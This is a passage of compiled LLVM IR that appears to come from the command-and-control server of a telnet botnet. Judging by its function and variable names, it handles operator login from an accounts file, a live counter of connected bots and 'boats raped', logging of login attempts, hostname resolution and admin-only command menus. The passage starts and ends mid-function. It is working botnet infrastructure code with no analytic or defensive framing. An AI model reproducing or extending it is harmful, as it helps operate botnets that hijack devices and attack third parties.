  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %13

; <label>:6:                                      ; preds = %2
  %7 = load i8, i8* %1, align 1
  %8 = icmp eq i8 %7, 1
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %6
  %10 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 1
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %10, align 4
  br label %13

; <label>:13:                                     ; preds = %2, %6, %9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 40
  br i1 %exitcond, label %14, label %2

; <label>:14:                                     ; preds = %13
  %indvars.iv.next18 = add nuw nsw i64 %indvars.iv17, 1
  %exitcond19 = icmp eq i64 %indvars.iv.next18, 1000000
  br i1 %exitcond19, label %15, label %.preheader

; <label>:15:                                     ; preds = %14
  ret i32 undef
}

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %4 = icmp eq %struct._IO_FILE* %3, null
  br i1 %4, label %15, label %.preheader

.preheader:                                       ; preds = %1
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %7 = icmp eq i8* %6, null
  br i1 %7, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.015 = phi i32 [ %.0..011, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.0914 = phi i32 [ %.09., %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.01113 = phi i32 [ %11, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %8 = call i8* @strstr(i8* nonnull %5, i8* %0) #9
  %9 = icmp eq i8* %8, null
  %not. = xor i1 %9, true
  %10 = zext i1 %not. to i32
  %.09. = add nsw i32 %10, %.0914
  %.0..011 = select i1 %9, i32 %.015, i32 %.01113
  %11 = add nuw nsw i32 %.01113, 1
  %12 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %13 = icmp eq i8* %12, null
  br i1 %13, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %.lr.ph
  %phitmp = icmp eq i32 %.09., 0
  %phitmp17 = select i1 %phitmp, i32 0, i32 %.0..011
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %.09.lcssa = phi i32 [ 0, %.preheader ], [ %phitmp17, %.loopexit.loopexit ]
  %14 = call i32 @fclose(%struct._IO_FILE* nonnull %3)
  br label %15

; <label>:15:                                     ; preds = %.loopexit, %1
  %.012 = phi i32 [ -1, %1 ], [ %.09.lcssa, %.loopexit ]
  ret i32 %.012
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) local_unnamed_addr #0 {
  %.sroa.0.4.extract.shift = lshr i64 %0, 32
  %.sroa.0.4.extract.trunc = trunc i64 %.sroa.0.4.extract.shift to i32
  %3 = and i32 %.sroa.0.4.extract.trunc, 255
  %4 = lshr i64 %0, 40
  %5 = trunc i64 %4 to i32
  %6 = and i32 %5, 255
  %7 = lshr i64 %0, 48
  %8 = trunc i64 %7 to i32
  %9 = and i32 %8, 255
  %10 = lshr i64 %0, 56
  %11 = trunc i64 %10 to i32
  %12 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0), i32 %3, i32 %6, i32 %9, i32 %11)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @hostname_to_ip(i8*, i8*) local_unnamed_addr #0 {
  %3 = tail call %struct.hostent* @gethostbyname(i8* %0) #10
  %4 = icmp eq %struct.hostent* %3, null
  br i1 %4, label %5, label %6

; <label>:5:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0)) #10
  br label %17

; <label>:6:                                      ; preds = %2
  %7 = getelementptr inbounds %struct.hostent, %struct.hostent* %3, i64 0, i32 4
  %8 = bitcast i8*** %7 to %struct.in_addr***
  %9 = load %struct.in_addr**, %struct.in_addr*** %8, align 8
  %10 = load %struct.in_addr*, %struct.in_addr** %9, align 8
  %11 = icmp eq %struct.in_addr* %10, null
  br i1 %11, label %17, label %12

; <label>:12:                                     ; preds = %6
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %10, i64 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #10
  %16 = tail call i8* @strcpy(i8* %1, i8* %15) #10
  br label %17

; <label>:17:                                     ; preds = %6, %12, %5
  %.0 = phi i32 [ 1, %5 ], [ 0, %12 ], [ 1, %6 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @titleWriter(i8*) #6 {
  %2 = alloca [2048 x i8], align 16
  %3 = alloca [1000 x i8], align 16
  %4 = ptrtoint i8* %0 to i64
  %5 = trunc i64 %4 to i32
  %6 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 1000, i32 16, i1 false)
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %2, i64 0, i64 0
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %1
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %8 = call i32 @clientsConnected()
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %10 = call i64 @strlen(i8* nonnull %7) #9
  %11 = call i64 @send(i32 %5, i8* nonnull %7, i64 %10, i32 16384) #10
  %12 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %13 = call i32 @clientsConnected()
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %13, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %15 = call i64 @strlen(i8* nonnull %7) #9
  %16 = call i64 @send(i32 %5, i8* nonnull %7, i64 %15, i32 16384) #10
  %17 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %18 = call i32 @clientsConnected()
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %20 = call i64 @strlen(i8* nonnull %7) #9
  %21 = call i64 @send(i32 %5, i8* nonnull %7, i64 %20, i32 16384) #10
  %22 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %23 = call i32 @clientsConnected()
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %23, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %25 = call i64 @strlen(i8* nonnull %7) #9
  %26 = call i64 @send(i32 %5, i8* nonnull %7, i64 %25, i32 16384) #10
  %27 = call i32 @sleep(i32 1) #10
  br label %.loopexit
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define noalias i8* @telnetWorker(i8*) #0 {
  %2 = alloca i64, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [80 x i8], align 16
  %7 = alloca [512 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca [100 x i8*], align 16
  %10 = alloca [20 x i8], align 16
  %11 = alloca [50 x i8*], align 16
  %12 = ptrtoint i8* %0 to i64
  %13 = trunc i64 %12 to i32
  %14 = load volatile i32, i32* @managesConnected, align 4
  %15 = add nsw i32 %14, 1
  store volatile i32 %15, i32* @managesConnected, align 4
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 2048, i32 16, i1 false)
  %18 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %19 = tail call i32 @feof(%struct._IO_FILE* %18) #10
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %.lr.ph166.preheader, label %._crit_edge167.thread

.lr.ph166.preheader:                              ; preds = %1
  br label %.lr.ph166

._crit_edge167.thread:                            ; preds = %1
  tail call void @rewind(%struct._IO_FILE* %18)
  br label %.lr.ph163.preheader

.lr.ph166:                                        ; preds = %.lr.ph166.preheader, %.lr.ph166
  %.0142164 = phi i32 [ %22, %.lr.ph166 ], [ 0, %.lr.ph166.preheader ]
  %21 = tail call i32 @fgetc(%struct._IO_FILE* %18)
  %22 = add nuw nsw i32 %.0142164, 1
  %23 = tail call i32 @feof(%struct._IO_FILE* %18) #10
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %.lr.ph166, label %._crit_edge167

._crit_edge167:                                   ; preds = %.lr.ph166
  tail call void @rewind(%struct._IO_FILE* %18)
  %25 = icmp eq i32 %.0142164, 0
  br i1 %25, label %._crit_edge, label %.lr.ph163.preheader

.lr.ph163.preheader:                              ; preds = %._crit_edge167.thread, %._crit_edge167
  %26 = phi i32 [ -1, %._crit_edge167.thread ], [ %.0142164, %._crit_edge167 ]
  %wide.trip.count = zext i32 %26 to i64
  br label %.lr.ph163

.lr.ph163:                                        ; preds = %.lr.ph163.preheader, %.lr.ph163
  %indvars.iv175 = phi i64 [ 0, %.lr.ph163.preheader ], [ %indvars.iv.next176, %.lr.ph163 ]
  %27 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 0, i64 0
  %28 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 1, i64 0
  %29 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 2, i64 0
  %30 = tail call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* %27, i8* %28, i8* %29) #10
  %indvars.iv.next176 = add nuw nsw i64 %indvars.iv175, 1
  %exitcond = icmp eq i64 %indvars.iv.next176, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph163

._crit_edge.loopexit:                             ; preds = %.lr.ph163
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge167
  %31 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %32 = icmp slt i32 %31, 1
  br i1 %32, label %.loopexit151, label %33

; <label>:33:                                     ; preds = %._crit_edge
  %34 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0)) #9
  %35 = icmp eq i8* %34, null
  br i1 %35, label %.loopexit151, label %36

; <label>:36:                                     ; preds = %33
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i64 0, i64 0), i64 30, i32 1, i1 false)
  %37 = call i64 @strlen(i8* nonnull %17) #9
  %38 = call i64 @send(i32 %13, i8* nonnull %17, i64 %37, i32 16384) #10
  %39 = icmp eq i64 %38, -1
  br i1 %39, label %.loopexit151, label %40

; <label>:40:                                     ; preds = %36
  %41 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %.loopexit151, label %43

; <label>:43:                                     ; preds = %40
  call void @trim(i8* nonnull %16)
  %44 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %45 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %44, i8* nonnull %16) #10
  %46 = call i32 @Search_in_File(i8* nonnull %16)
  %47 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %48 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %47, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* nonnull %16)
  %49 = call i32 @fclose(%struct._IO_FILE* %47)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* nonnull %16)
  %51 = sext i32 %46 to i64
  %52 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 0, i64 0
  %53 = call i32 @strcmp(i8* nonnull %16, i8* %52) #9
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %69

; <label>:55:                                     ; preds = %43
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i64 0, i64 0), i64 30, i32 1, i1 false)
  %56 = call i64 @strlen(i8* nonnull %17) #9
  %57 = call i64 @send(i32 %13, i8* nonnull %17, i64 %56, i32 16384) #10
  %58 = icmp eq i64 %57, -1
  br i1 %58, label %.loopexit151, label %59

; <label>:59:                                     ; preds = %55
  %60 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %.loopexit151, label %62

; <label>:62:                                     ; preds = %59
  call void @trim(i8* nonnull %16)
  %63 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 1, i64 0
  %64 = call i32 @strcmp(i8* nonnull %16, i8* %63) #9
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %62
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  %67 = call i64 @send(i32 %13, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 14, i32 16384) #10
  %68 = icmp eq i64 %67, -1
  br i1 %68, label %.loopexit151, label %76

; <label>:69:                                     ; preds = %62, %43
  %70 = call i64 @send(i32 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i64 5, i32 16384) #10
  %71 = icmp eq i64 %70, -1
  br i1 %71, label %.loopexit151, label %72

; <label>:72:                                     ; preds = %69
  %73 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %74 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %73, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0), i8* nonnull %16)
  %75 = call i32 @fclose(%struct._IO_FILE* %73)
  br label %.loopexit151

; <label>:76:                                     ; preds = %66
  %77 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  %78 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %77, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* %52) #10
  %79 = call i64 @strlen(i8* nonnull %77) #9
  %80 = call i64 @send(i32 %13, i8* nonnull %77, i64 %79, i32 16384) #10
  %81 = icmp eq i64 %80, -1
  br i1 %81, label %.loopexit151, label %82

; <label>:82:                                     ; preds = %76
  %83 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %sext147 = shl i64 %12, 32
  %84 = ashr exact i64 %sext147, 32
  %85 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %84, i32 2, i64 0
  %strlen = call i64 @strlen(i8* %52)
  %leninc = add i64 %strlen, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %85, i8* %52, i64 %leninc, i32 4, i1 false)
  %86 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %84, i32 1
  store i32 1, i32* %86, align 4
  %87 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %88 = icmp sgt i32 %87, 0
  br i1 %88, label %.lr.ph, label %.loopexit151

.lr.ph:                                           ; preds = %82
  %89 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 2, i64 0
  %90 = bitcast [50 x i8*]* %11 to i8*
  %91 = getelementptr inbounds [20 x i8], [20 x i8]* %10, i64 0, i64 0
  %92 = getelementptr inbounds [100 x i8*], [100 x i8*]* %9, i64 0, i64 0
  %93 = bitcast [100 x i8*]* %9 to i8*
  %94 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %95 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  br label %96

; <label>:96:                                     ; preds = %.lr.ph, %.backedge
  %97 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #9
  %98 = icmp eq i8* %97, null
  br i1 %98, label %99, label %105

; <label>:99:                                     ; preds = %96
  %100 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i64 0, i64 0)) #9
  %101 = icmp eq i8* %100, null
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %99
  %103 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i64 0, i64 0)) #9
  %104 = icmp eq i8* %103, null
  br i1 %104, label %128, label %105

; <label>:105:                                    ; preds = %102, %99, %96
  %106 = call i32 @joinn()
  br label %107

; <label>:107:                                    ; preds = %105, %120
  %indvars.iv = phi i64 [ 0, %105 ], [ %indvars.iv.next, %120 ]
  %108 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 1
  %109 = load i32, i32* %108, align 4
  %110 = icmp slt i32 %109, 1
  %111 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 0, i64 0
  br i1 %110, label %112, label %._crit_edge177

; <label>:112:                                    ; preds = %107
  call void @llvm.memset.p0i8.i64(i8* %111, i8 0, i64 512, i32 4, i1 false)
  br label %._crit_edge177

._crit_edge177:                                   ; preds = %107, %112
  %strlenfirst = load i8, i8* %111, align 4
  %113 = icmp eq i8 %strlenfirst, 0
  br i1 %113, label %120, label %114

; <label>:114:                                    ; preds = %._crit_edge177
  %115 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %94, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i64 0, i64 0), i8* %111, i32 %109) #10
  %116 = call i64 @strlen(i8* nonnull %94) #9
  %117 = call i64 @send(i32 %13, i8* nonnull %94, i64 %116, i32 16384) #10
  %118 = icmp eq i64 %117, -1
  br i1 %118, label %.loopexit151.loopexit, label %119

; <label>:119:                                    ; preds = %114
  call void @llvm.memset.p0i8.i64(i8* nonnull %94, i8 0, i64 512, i32 16, i1 false)
  br label %120

; <label>:120:                                    ; preds = %._crit_edge177, %119
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %121 = icmp slt i64 %indvars.iv.next, 40
  br i1 %121, label %107, label %122

; <label>:122:                                    ; preds = %120
  %123 = call i32 @clientsConnected()
  %124 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %95, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i64 0, i64 0), i32 %123) #10
  %125 = call i64 @strlen(i8* nonnull %95) #9
  %126 = call i64 @send(i32 %13, i8* nonnull %95, i64 %125, i32 16384) #10
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %.loopexit151.loopexit185, label %128

; <label>:128:                                    ; preds = %102, %122
  %129 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i64 0, i64 0)) #9
  %130 = icmp eq i8* %129, null
  br i1 %130, label %136, label %131

; <label>:131:                                    ; preds = %128
  %132 = load volatile i32, i32* @BOATSRAPED, align 4
  %133 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i64 0, i64 0), i32 %132) #10
  %134 = call i64 @strlen(i8* nonnull %17) #9
  %135 = call i64 @send(i32 %13, i8* nonnull %17, i64 %134, i32 16384) #10
  br label %136

; <label>:136:                                    ; preds = %128, %131
  %137 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i64 0, i64 0)) #9
  %138 = icmp eq i8* %137, null
  br i1 %138, label %146, label %139

; <label>:139:                                    ; preds = %136
  %140 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #10
  %141 = getelementptr inbounds i8, i8* %140, i64 8
  call void @trim(i8* %141)
  %142 = call i32 @hostname_to_ip(i8* %141, i8* nonnull %93)
  %143 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i64 0, i64 0), i8* %141, i8** nonnull %92) #10
  %144 = call i64 @strlen(i8* nonnull %17) #9
  %145 = call i64 @send(i32 %13, i8* nonnull %17, i64 %144, i32 16384) #10
  br label %146

; <label>:146:                                    ; preds = %136, %139
  %147 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i64 0, i64 0)) #9
  %148 = icmp eq i8* %147, null
  br i1 %148, label %156, label %149

; <label>:149:                                    ; preds = %146
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i64 0, i64 0), i64 37, i32 1, i1 false)
  %150 = call i64 @strlen(i8* nonnull %17) #9
  %151 = call i64 @send(i32 %13, i8* nonnull %17, i64 %150, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i64 0, i64 0), i64 36, i32 1, i1 false)
  %152 = call i64 @strlen(i8* nonnull %17) #9
  %153 = call i64 @send(i32 %13, i8* nonnull %17, i64 %152, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i64 0, i64 0), i64 29, i32 1, i1 false)
  %154 = call i64 @strlen(i8* nonnull %17) #9
  %155 = call i64 @send(i32 %13, i8* nonnull %17, i64 %154, i32 16384) #10
  br label %156

; <label>:156:                                    ; preds = %146, %149
  %157 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0)) #9
  %158 = icmp eq i8* %157, null
  br i1 %158, label %166, label %159

; <label>:159:                                    ; preds = %156
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i64 0, i64 0), i64 29, i32 1, i1 false)
  %160 = call i64 @strlen(i8* nonnull %17) #9
  %161 = call i64 @send(i32 %13, i8* nonnull %17, i64 %160, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i64 0, i64 0), i64 29, i32 1, i1 false)
  %162 = call i64 @strlen(i8* nonnull %17) #9
  %163 = call i64 @send(i32 %13, i8* nonnull %17, i64 %162, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i64 0, i64 0), i64 28, i32 1, i1 false)
  %164 = call i64 @strlen(i8* nonnull %17) #9
  %165 = call i64 @send(i32 %13, i8* nonnull %17, i64 %164, i32 16384) #10
  br label %166

; <label>:166:                                    ; preds = %156, %159
  %167 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i64 0, i64 0)) #9
  %168 = icmp eq i8* %167, null
  br i1 %168, label %189, label %169

; <label>:169:                                    ; preds = %166
  %170 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %89) #9
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %175, label %172

; <label>:172:                                    ; preds = %169
  %173 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %89) #9
  %174 = icmp eq i32 %173, 0
  br i1 %174, label %175, label %186

; <label>:175:                                    ; preds = %172, %169
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i64 0, i64 0), i64 51, i32 1, i1 false)
  %176 = call i64 @strlen(i8* nonnull %17) #9
  %177 = call i64 @send(i32 %13, i8* nonnull %17, i64 %176, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i64 0, i64 0), i64 46, i32 1, i1 false)
  %178 = call i64 @strlen(i8* nonnull %17) #9
  %179 = call i64 @send(i32 %13, i8* nonnull %17, i64 %178, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i64 0, i64 0), i64 66, i32 1, i1 false)
  %180 = call i64 @strlen(i8* nonnull %17) #9
  %181 = call i64 @send(i32 %13, i8* nonnull %17, i64 %180, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i64 0, i64 0), i64 32, i32 1, i1 false)
  %182 = call i64 @strlen(i8* nonnull %17) #9
  %183 = call i64 @send(i32 %13, i8* nonnull %17, i64 %182, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i64 0, i64 0), i64 39, i32 1, i1 false)
  %184 = call i64 @strlen(i8* nonnull %17) #9
  %185 = call i64 @send(i32 %13, i8* nonnull %17, i64 %184, i32 16384) #10
  br label %189

; <label>:186:                                    ; preds = %172
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %187 = call i64 @strlen(i8* nonnull %17) #9
  %188 = call i64 @send(i32 %13, i8* nonnull %17, i64 %187, i32 16384) #10
  br label %189

; <label>:189:                                    ; preds = %166, %175, %186
  %190 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #9
  %191 = icmp eq i8* %190, null
  br i1 %191, label %197, label %192

; <label>:192:                                    ; preds = %189
